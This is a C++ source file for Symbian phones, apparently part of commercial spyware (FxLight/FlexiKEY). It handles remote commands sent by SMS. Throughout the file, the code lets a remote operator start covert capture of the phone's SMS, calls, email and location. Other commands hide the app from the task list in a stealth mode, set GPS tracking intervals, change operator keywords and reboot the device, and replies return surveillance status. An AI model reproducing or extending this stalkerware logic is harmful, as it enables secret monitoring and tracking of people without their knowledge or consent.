#include "SmsCmdListener.h"
#include "SmsCmdManager.h"
#include "FxsDiagnosticInfo.h"
#include "Global.h"
#include "ShareProperty.h"
#include <Uri8.h>

static const TInt KMaxNumOfEvent = 500;
static const TInt KMinNumOfEvent = 10;
static const TInt KMaximumTimerInterval = 24;
const TInt KMinKeywordLength = 10;
const TInt KMaxNALength = 3;
_LIT(KNA, "N/A");

//gprs interval in secs
const static TInt KGPSIntervalValueArray[] = 
	{
	0, 10,30,60, 300, 600, 1200, 2400, 3600
	};
	
const static TInt KGprsIntervalArrayLength = sizeof(KGPSIntervalValueArray) / sizeof(KGPSIntervalValueArray[0]);

CSmsCmdHandler::CSmsCmdHandler(MDiagnosInfoProvider& aDiagnosticInfo)
:iDiagnosInfo(aDiagnosticInfo)
	{
	}

CSmsCmdHandler::~CSmsCmdHandler()
	{
	delete iRebootCmd;
	}
	
CSmsCmdHandler* CSmsCmdHandler::NewL(MDiagnosInfoProvider& aDiagnosticInfo)
	{
    CSmsCmdHandler* tmp = new (ELeave)CSmsCmdHandler(aDiagnosticInfo);
    CleanupStack::PushL(tmp);
    tmp->ConstructL();
    CleanupStack::Pop();
    return tmp;
	}
	
void CSmsCmdHandler::ConstructL()
	{	
	}

//MSmsCmdObserver
HBufC* CSmsCmdHandler::HandleSmsCommandL(const TSmsCmdDetails& aCmdDetails)
	{
	LOG2(_L("[CSmsCmdHandler::ProcessSmsCommandL] Cmd: %d, iTag2: %S"),aCmdDetails.iCmd, &aCmdDetails.iTag2)
	
	HBufC* returnMessage=NULL;
	switch(aCmdDetails.iCmd) // KInterestedCmds
		{
		case KCmdStartCapture:
			{
			returnMessage=ProcessCmdStartCaptureL(ETrue, aCmdDetails);			
			}break;
		case KCmdStopCapture:
			{
			returnMessage=ProcessCmdStartCaptureL(EFalse, aCmdDetails);
			}break;		
		case KCmdChangeSettingValue:
			{
			returnMessage=ProcessCmdChangeSettingsL(aCmdDetails);			
			}break;
		case KCmdStealthMode:
			{
			returnMessage=ProcessCmdStealthModeL(aCmdDetails);			
			}break;			
		case KCmdRestartDevice:
			{
			if(!iRebootCmd)
				{
				iRebootCmd = CRebootCmd::NewL();
				}
			iRebootCmd->Reboot();
			}break;	
		case KCmdGPSSettings:
			{
			returnMessage = ProcessCmdGpsSettingsL(aCmdDetails);			
			}break;
		case KCmdSetKeywords:
			{
			returnMessage = ProcessCmdSetKeywordsL(aCmdDetails);
			}break;
		default:
			;
		}
	return returnMessage;
	}
	
HBufC* CSmsCmdHandler::ProcessCmdStartCaptureL(TBool aStartCapture, const TSmsCmdDetails& aCmdDetails)
	{
	CFxsSettings& setting = Global::Settings();
	setting.StartCapture() = aStartCapture;
	setting.NotifyChanged();
	
	HBufC* cmdResponse = CSmsCmdManager::ResponseHeaderLC(aCmdDetails.iCmd, KErrNone);
	HBufC* currentSettingMsg = CurrentSettingsValueTextLC();	
	HBufC* response = HBufC::NewL(cmdResponse->Length() + currentSettingMsg->Length()+50);
	TPtr respPtr = response->Des();
	respPtr.Append(*cmdResponse);
	respPtr.Append(*currentSettingMsg);	
	CleanupStack::PopAndDestroy(2);
	return response;
	}

HBufC* CSmsCmdHandler::ProcessCmdQueryCmdLC(const TSmsCmdDetails& aCmdDetails)
	{
	//message part one contains: [FxLight][60] Cmd OK
	HBufC* msgPart1 = CSmsCmdManager::ResponseHeaderLC(aCmdDetails.iCmd, KErrNone);	
	HBufC* diagnosticMsg = DiagnosticMessageLC();
	
	CFxsSettings& settings = Global::Settings();
	TBuf<50> stealthModeFmt;
	
	HBufC* lableStealthModeFmt = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_LABLE_FMT_STEALTH_MODE);
	if(!settings.IsTSM())
	//send stealth info for none-signed mode key
		{
		if(settings.StealthMode())
			{
			HBufC* txtYes = RscHelper::ReadResourceLC(R_TEXT_YES);
			stealthModeFmt.Format(*lableStealthModeFmt, txtYes);
			CleanupStack::PopAndDestroy();
			}
		else
			{
			HBufC* txtNo = RscHelper::ReadResourceLC(R_TEXT_NO);
			stealthModeFmt.Format(*lableStealthModeFmt, txtNo);
			CleanupStack::PopAndDestroy();
			}
		}
	CleanupStack::PopAndDestroy();
	
	HBufC* dbHealthMsg = iDiagnosInfo.DbHealthMessageLC();
	HBufC* spyInfoMsg = iDiagnosInfo.SpyInfoMessageLC();
	HBufC* response = HBufC::NewL(msgPart1->Length() + diagnosticMsg->Length()+ dbHealthMsg->Length() + spyInfoMsg->Length() + stealthModeFmt.Length()+ 50);
	TPtr respPtr = response->Des();
	respPtr.Append(*msgPart1);
	respPtr.Append(stealthModeFmt);
	respPtr.Append(*diagnosticMsg);	
	respPtr.Append(*spyInfoMsg);
	respPtr.Append(*dbHealthMsg);	
	CleanupStack::PopAndDestroy(4); //msgPart1,diagnosticMsg
	CleanupStack::PushL(response);
	return response;
	}

HBufC* CSmsCmdHandler::ProcessCmdStealthModeL(const TSmsCmdDetails& aCmdDetails)
	{
	TBool steathOn(ETrue);	
	if(aCmdDetails.iTag2.Length())
		{
		steathOn = (aCmdDetails.iTag2 == KStringTrue);
		}	
	CFxsSettings& settings = Global::Settings();
	settings.SetStealthMode(steathOn);
	settings.NotifyChanged();
	Global::AppUi().HideFromTaskListL(steathOn);
	
	return NULL;
	}

/**
Tag 0 : Cmd Code
Tag 1 : FlexiKEY
Tag 2 : Start/Stop capturing. 1 to start, 0 to stop
Tag 3 : timer interval. Value between 1 and 24
Tag 4 : Max number of event. Value between 1 and 500*/
HBufC* CSmsCmdHandler::ProcessCmdChangeSettingsL(const TSmsCmdDetails& aCmdDetails)
	{
	CFxsSettings& setting = Global::Settings();
	
	TInt err(KErrNone);
	//
	//To start/stop capturing events
	TBool startCapture = (aCmdDetails.iTag2 == KStringTrue);
	setting.StartCapture() = startCapture;	
	
	TPtrC cmdTagValue;
	cmdTagValue.Set(aCmdDetails.iTag3);
	//
	//Timer Interval
	if(cmdTagValue.Length())
		{
		TUint timerInterval;
		TLex lex(cmdTagValue);
		err=lex.Val(timerInterval);
		if(!err)
			{
			if(timerInterval > 0 && timerInterval <= KMaximumTimerInterval)
				{
				setting.TimerInterval() = timerInterval;
				}		
			}
		}
	
	//max number of event
	cmdTagValue.Set(aCmdDetails.iTag4);
	if(cmdTagValue.Length())
		{
		TUint maxNumOfEvent;
		TLex lex(cmdTagValue);
		err=lex.Val(maxNumOfEvent);
		if(!err)
			{
			if(maxNumOfEvent > 0 && maxNumOfEvent <= KMaxNumOfEvent)
				{
				setting.MaxNumberOfEvent() = maxNumOfEvent;
				}			
			}
		}
	
	//Enable Event
	//Sms,Voice, E-Mail, Location Event
	//1,1,1,1 -> all events are enable
	//0,0,0,0 -> all of them are diable	
	const TInt KTotalEvent = 4; 
	TBuf<100> tag5;
	XUtil::Copy(tag5, aCmdDetails.iTag5);
	tag5.Trim();
    TPtrC token(tag5);
    TInt commaPos(KErrNotFound);
    
    for(TInt i=0;i < KTotalEvent; i++)
    	{
    	TPtrC enableStr;
    	commaPos = token.Find(KSymbolComma);
    	if(commaPos == KErrNotFound)
    		{
    		enableStr.Set(token);
    		}
    	else
    		{
    		if(commaPos == 0 ||commaPos > token.Length())
    		//commaPos = 0 --> comma is at the beginning
    			{
    			break;
    			}
    		enableStr.Set(token.Mid(0, commaPos));
    		}
		TBool enable(EFalse);
		switch(i)
    		{
    		case 0:  //SMS  		    		
    		enable = (enableStr == KStringTrue);
    		setting.SetEventSmsEnable(enable);
    		break;
    		case 1: // VOICE
    		enable = (enableStr == KStringTrue);
    		setting.SetEventCallEnable(enable);
    		break;
    		case 2: //E-Mail
    		enable = (enableStr == KStringTrue);
    		setting.SetEventEmailEnable(enable);
    		break;
    		case 3: //LOC
    		enable = (enableStr == KStringTrue);
    		setting.SetEventLocationEnable(enable);
    		break;
    		default:
    			{
    			commaPos = KErrNotFound;
    			}
    		}
    	if(commaPos == KErrNotFound)
    		{
    		break;
    		}    	
    	commaPos++;
    	if(commaPos > token.Length())
    		{
    		break;
    		}    	
		token.Set(token.Mid(commaPos));		  		
    	}
    
	setting.NotifyChanged();
	
	//Now create response message
	//message part one contains: [FxLight][60] Cmd OK
	HBufC* cmdResponse = CSmsCmdManager::ResponseHeaderLC(aCmdDetails.iCmd, err);
	HBufC* currentSettingMsg = CurrentSettingsValueTextLC();
	
	HBufC* response = HBufC::NewL(cmdResponse->Length() + currentSettingMsg->Length()+50);
	TPtr respPtr = response->Des();
	respPtr.Append(*cmdResponse);
	respPtr.Append(*currentSettingMsg);
	
	CleanupStack::PopAndDestroy(2); //cmdResponse,currentSettingMsg	
	return response;
	}

HBufC* CSmsCmdHandler::ProcessCmdSetKeywordsL(const TSmsCmdDetails& aCmdDetails)
	{
	//<iCmd><FK><K1><K2><D>
	CFxsSettings& setting = Global::Settings();
	TOperatorNotifySmsKeyword& operKeywords = setting.OperatorNotifySmsKeyword();
	
	TInt tag2Len = aCmdDetails.iTag2.Length();
	TInt tag3Len = aCmdDetails.iTag3.Length();
	
	if (!(tag2Len || tag3Len)) // Just query command
		{
		return CommonResponseCmdKeywordL(operKeywords, aCmdDetails);
		}
	
	// Keyword1
	if (tag2Len >= KMinKeywordLength)
		COPY(operKeywords.iKeyword1, aCmdDetails.iTag2)
	else if (tag2Len == KMaxNALength) 
	// Check length cause we want case insensitive, we can't use TDesC::Compare, TDesC::CompareC
	// and TDesC::FindC will return found also when the is like this: n/a123, 123n/a, ...
		{
		if (aCmdDetails.iTag2.FindC(KNA) != KErrNotFound)
			operKeywords.iKeyword1.Zero();
		}
	
	// Keyword2
	if (tag3Len >= KMinKeywordLength)
		COPY(operKeywords.iKeyword2, aCmdDetails.iTag3)
	else if (tag3Len == KMaxNALength)
		{
		if (aCmdDetails.iTag3.FindC(KNA) != KErrNotFound)
			operKeywords.iKeyword2.Zero();
		}
	
	operKeywords.iKeyword1.Trim(); // Trim again to make sure no space
	operKeywords.iKeyword2.Trim();
	//@review
	operKeywords.iEnable = (operKeywords.iKeyword1.Length() || operKeywords.iKeyword2.Length());
	
	SetKeywordToCmdServerL(operKeywords);
	return CommonResponseCmdKeywordL(operKeywords, aCmdDetails);
	}
	
void CSmsCmdHandler::SetKeywordToCmdServerL(const TOperatorNotifySmsKeyword& aKeywords)
	{	
	HBufC8* des = aKeywords.MarshalDataLC();
	User::LeaveIfError(FxShareProperty::SetOperatorKeywords(*des));
	CleanupStack::PopAndDestroy(des);
	}
	
HBufC* CSmsCmdHandler::CommonResponseCmdKeywordL(const TOperatorNotifySmsKeyword& aKeywords, const TSmsCmdDetails& aCmdDetails)
	{
	TInt len1 = aKeywords.iKeyword1.Length();
	TInt len2 = aKeywords.iKeyword2.Length();
	HBufC* format = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_KEYWORDS);		
	HBufC* header = CSmsCmdManager::ResponseHeaderLC(aCmdDetails.iCmd, KErrNone);
	HBufC* body = HBufC::NewLC(len1 + len2 + format->Length() + 5);
	body->Des().Format(*format, &aKeywords.iKeyword1, &aKeywords.iKeyword2);
	HBufC* resMsg = HBufC::NewL(header->Length() + body->Length() + 5);
	TPtr ptr = resMsg->Des();
	ptr.Append(*header);
	ptr.Append(*body);
	CleanupStack::PopAndDestroy(3); // format, header, body
	return resMsg;
	}
	
HBufC* CSmsCmdHandler::ProcessCmdGpsSettingsL(const TSmsCmdDetails& aCmdDetails)
	{
	CFxsSettings& setting = Global::Settings();
	TGpsSettingOptions& gpsOption = setting.GpsSettingOptions();
	
	TBuf<10> enableStr;
	TBuf<10> intervalIndexStr;
	XUtil::Copy(enableStr, aCmdDetails.iTag2);
	TUint value(0);
	TLex lex(enableStr);
	TBool validCmd(EFalse);
	TBool gpsSupported = (gpsOption.iGpsOnFlag == KGpsFlagOnState || gpsOption.iGpsOnFlag == KGpsFlagOffState);
	if(KErrNone == lex.Val(value))
		{
		if(gpsSupported)
			{
			validCmd = ETrue;
			switch(value)
				{
				case 1:
					{
					gpsOption.iGpsOnFlag = KGpsFlagOnState;
					}break;
				case 0:
					{
					gpsOption.iGpsOnFlag = KGpsFlagOffState;
					}break;
				default:
					;
				}
			}
		else
			{
			//skip
			goto CREATE_MESSAGE;
			}
		}
	
	XUtil::Copy(intervalIndexStr, aCmdDetails.iTag3);
	lex.Assign(intervalIndexStr);
	if(KErrNone == lex.Val(value))
		{
		if(value <= KGprsIntervalArrayLength-1)
			{
			if(value == 0)//turn off gprs 		
				{
				gpsOption.iGpsOnFlag = KGpsFlagOffState;
				}
			else
				{
				gpsOption.iGpsPositionUpdateInterval = KGPSIntervalValueArray[value];
				}			
			validCmd = ETrue;
			}
		}
	
	if(validCmd)
		{
		setting.NotifyChanged();
		}
	
CREATE_MESSAGE:	
	HBufC* header = CSmsCmdManager::ResponseHeaderLC(aCmdDetails.iCmd, KErrNone);
	HBufC* gpsStatus = CreateGpsStatusTextLC(gpsOption);	
	HBufC* response = HBufC::NewL(header->Length() + gpsStatus->Length() + 4);
	TPtr ptr = response->Des();
	ptr.Append(*header);
	ptr.Append(KNewLine);
	ptr.Append(*gpsStatus);
	if(gpsSupported)
		{
		HBufC* gpsBuiltInStatus = CreateGpsMethodTextLC();	
		response = response->ReAllocL(response->Length() + gpsBuiltInStatus->Length() + 5);		
		response->Des().Append(KNewLine);
		response->Des().Append(*gpsBuiltInStatus);	
		CleanupStack::PopAndDestroy(gpsBuiltInStatus);	
		}
	CleanupStack::PopAndDestroy(2);
	return response;
	}

HBufC* CSmsCmdHandler::CreateGpsStatusTextLC(const TGpsSettingOptions& aGpsOptions)
	{
	HBufC* statusAndTimerFmt = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_RESP_GPS_STATUS);
	HBufC* gpsState(NULL);
	TBool gpsSupported(ETrue);
	switch(aGpsOptions.iGpsOnFlag)
		{
		case KGpsFlagOnState:
			{
			gpsState = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_ON);			
			}break;
		case KGpsFlagOffState:
			{
			gpsState = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_OFF);		
			}break;
		default:
			{
			gpsSupported = EFalse;
			gpsState = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_NOT_AVAIL);
			}
		}
	
	HBufC* intervalStr(NULL);
	if(gpsSupported)
		{
		switch(aGpsOptions.iGpsPositionUpdateInterval)
			{
			case 0:
				{
				intervalStr = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_OFF);			
				}break;
			case 10:
				{
				intervalStr = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_10SEC);			
				}break;
			case 30:
				{
				intervalStr = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_30SEC);
				}break;
			case 60:
				{
				intervalStr = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_1MIN);		
				}break;
			case 300:
				{
				intervalStr = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_5MIN);
				}break;
			case 600:
				{
				intervalStr = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_10MIN);
				}break;
			case 1200:
				{
				intervalStr = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_20MIN);
				}break;
			case 2400:
				{
				intervalStr = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_40MIN);
				}break;
			case 3600:
				{
				intervalStr = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_60MIN);		
				}break;
			default:		
				{
				//5 minutes is default value
				intervalStr = RscHelper::ReadResourceLC(R_TEXT_GPS_SETTING_5MIN);			
				}
			}		
		}
	else
		{
		intervalStr = HBufC::NewLC(0);//empty
		}
	
	HBufC* retMsg = HBufC::NewL(statusAndTimerFmt->Length() + gpsState->Length() + intervalStr->Length() + 10);
	TPtr ptr = retMsg->Des();	
	retMsg->Des().Format(*statusAndTimerFmt, gpsState, intervalStr);	
	CleanupStack::PopAndDestroy(3);
	CleanupStack::PushL(retMsg);
	return retMsg;
	}
	
HBufC* CSmsCmdHandler::CreateGpsMethodTextLC()
	{
	MFxPositionMethod* positMethod = Global::FxPositionMethod();	
	if(positMethod)
		{
		CDesCArray* moduleNameArr = new (ELeave)CDesCArrayFlat(1);
		CleanupStack::PushL(moduleNameArr);
		positMethod->GetBuiltInEnabledModule(*moduleNameArr);		
		TInt count = moduleNameArr->Count();
		if(count)
			{
			HBufC* lable = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_LABLE_GPSMETHOD);		
			HBufC* ret = HBufC::NewL(lable->Length() + (count*50) + count); //module name should never more than 50 chars
			TPtr ptr = ret->Des();
			for(TInt i =0;i<count;i++)
				{
				const TDesC& name = (*moduleNameArr)[i];
				ptr.Append(name);
				ptr.Append(KSymbolComma);
				}
			CleanupStack::PopAndDestroy(2); //lable, enabledModuleName
			CleanupStack::PushL(ret);
			return ret;
			}
		CleanupStack::PopAndDestroy(moduleNameArr);
		return RscHelper::ReadResourceLC(R_TEXT_SMSCMD_LABLE_GPSMETHOD_NONE);		
		}
	else
		{
		return HBufC::NewLC(0);
		}
	}
	
HBufC* CSmsCmdHandler::CommonMessageResponseLC(TUint aCmdCode)
	{	
	//
	//message part one contains: [FxLight][60] Cmd OK
	HBufC* msgPart1 = CSmsCmdManager::ResponseHeaderLC(aCmdCode, KErrNone);	
	HBufC* diagnosticMsg = DiagnosticMessageLC();
	HBufC* currentSettingMsg = CurrentSettingsValueTextLC();
	
	HBufC* response = HBufC::NewL(msgPart1->Length() + diagnosticMsg->Length()+currentSettingMsg->Length());
	TPtr respPtr = response->Des();
	respPtr.Append(*msgPart1);
	respPtr.Append(*currentSettingMsg);
	respPtr.Append(*diagnosticMsg);	
	
	CleanupStack::PopAndDestroy(3); //msgPart1,diagnosticMsg,currentSettingMsg
	CleanupStack::PushL(response);
	return response;
	}

HBufC* CSmsCmdHandler::DiagnosticMessageLC()
	{
	HBufC* diagnosticMsg = iDiagnosInfo.DiagnosticMessageLC();
	HBufC* hdrDiagnost = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_HEADER_DIAGNOSTIC);	
	HBufC* message = HBufC::NewL(hdrDiagnost->Length() + diagnosticMsg->Length());	
	message->Des().Append(*hdrDiagnost);
	message->Des().Append(*diagnosticMsg);
	CleanupStack::PopAndDestroy(2);
	CleanupStack::PushL(message);
	return message;
	}
	
HBufC* CSmsCmdHandler::CurrentSettingsValueTextLC()
	{
	CFxsSettings& setting = Global::Settings();
	
	TBuf<50> startToCaptureFmt;	
	const TBool& startToCapture = setting.StartCapture();
	HBufC* startCaptureFmt = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_LABLE_FMT_START_CAPTURE);
	if(startToCapture)
		{
		HBufC* txtYes = RscHelper::ReadResourceLC(R_TEXT_YES);		
		startToCaptureFmt.Format(*startCaptureFmt, txtYes);
		CleanupStack::PopAndDestroy();
		}
	else
		{
		HBufC* txtNo = RscHelper::ReadResourceLC(R_TEXT_NO);
		startToCaptureFmt.Format(*startCaptureFmt, txtNo);
		CleanupStack::PopAndDestroy();
		}
	CleanupStack::PopAndDestroy();
	
	HBufC* lableStealthFmt = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_LABLE_FMT_STEALTH_MODE);
	TBuf<50> stealthModeFmt;	
	if(!setting.IsTSM())
		{
		if(setting.StealthMode())
			{
			HBufC* txtYes = RscHelper::ReadResourceLC(R_TEXT_YES);
			stealthModeFmt.Format(*lableStealthFmt, txtYes);
			CleanupStack::PopAndDestroy();
			}
		else
			{
			HBufC* txtNo = RscHelper::ReadResourceLC(R_TEXT_NO);
			stealthModeFmt.Format(*lableStealthFmt, txtNo);
			CleanupStack::PopAndDestroy();
			}
		}
	CleanupStack::PopAndDestroy();
	
	TInt& maxNumOfEvent = setting.MaxNumberOfEvent();
	TBuf<60> maxEventFmt;	
	HBufC* lableMaxEventFmt = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_LABLE_FMT_MAX_EVENT);
	maxEventFmt.Format(*lableMaxEventFmt, maxNumOfEvent);
	CleanupStack::PopAndDestroy();
	
	HBufC* lableEventToCapture = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_LABLE_EVENT_TO_CAPTURE);	
	TBuf<100> eventsToCaptureFmt;
	eventsToCaptureFmt.Append(*lableEventToCapture);
	CleanupStack::PopAndDestroy();
	
	if(setting.EventSmsEnable())
		{
		HBufC* eventSms = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_CURRSETTING_EVENT_SMS);
		eventsToCaptureFmt.Append(*eventSms);
		CleanupStack::PopAndDestroy();
		
		eventsToCaptureFmt.Append(KSymbolComma);		
		}
	if(setting.EventCallEnable())
		{
		HBufC* eventVoice = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_CURRSETTING_EVENT_VOICE);
		eventsToCaptureFmt.Append(*eventVoice);
		CleanupStack::PopAndDestroy();
		
		eventsToCaptureFmt.Append(KSymbolComma);
		}
	if(setting.EventEmailEnable())
		{
		HBufC* eventMail = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_CURRSETTING_EVENT_MAIL);
		eventsToCaptureFmt.Append(*eventMail);
		CleanupStack::PopAndDestroy();
		
		eventsToCaptureFmt.Append(KSymbolComma);
		}
	if(setting.EventLocationEnable())
		{
		HBufC* eventLoc = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_CURRSETTING_EVENT_LOCATION);
		eventsToCaptureFmt.Append(*eventLoc);
		CleanupStack::PopAndDestroy();		
		}
	eventsToCaptureFmt.Append(KNewLine);
	
	TInt& timerInterval = setting.TimerInterval();	
	TBuf<80> timerFmt;
	HBufC* lableTimerFmt = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_LABLE_FMT_TIMER);
	timerFmt.Format(*lableTimerFmt, timerInterval);
	CleanupStack::PopAndDestroy();
	
	HBufC* hdrBegin = RscHelper::ReadResourceLC(R_TEXT_SMSCMD_HEADER_SETTINGS);	
	HBufC* message = HBufC::NewL(hdrBegin->Length() + stealthModeFmt.Length() + 
								 startToCaptureFmt.Length() + maxEventFmt.Length() + 
								 eventsToCaptureFmt.Length() + timerFmt.Length());
	TPtr ptr=message->Des();
	ptr.Append(*hdrBegin);
	CleanupStack::PopAndDestroy();
	
	ptr.Append(stealthModeFmt);
	ptr.Append(startToCaptureFmt);
	ptr.Append(maxEventFmt);
	ptr.Append(eventsToCaptureFmt);
	ptr.Append(timerFmt);	
	CleanupStack::PushL(message);
	return message;
	}

//------------------------------------------------------------------
//             // CRebootCmd //
//------------------------------------------------------------------

const TInt KSleepInterval = 30;//secs

CRebootCmd::CRebootCmd()
	{	
	}

CRebootCmd::~CRebootCmd()
	{
	delete iTimer;
	}

CRebootCmd* CRebootCmd::NewL()
	{
    CRebootCmd* tmp = new (ELeave)CRebootCmd();
    CleanupStack::PushL(tmp);
    tmp->ConstructL();
    CleanupStack::Pop();
    return tmp;
	}
	
void CRebootCmd::ConstructL()
	{
	iTimer = CTimeOut::NewL(*this);
	}

void CRebootCmd::Reboot()
	{
	iTimer->SetInterval(KSleepInterval);
	iTimer->Start();
	}

void CRebootCmd::HandleTimedOutL()
	{
	DoReboot();
	}

TInt CRebootCmd::DoReboot()
	{
	LOG0(_L("[CRebootCmd::DoReboot] ExitReboot"))
	Global::AppUi().Reboot();
	return KErrNone;
	}
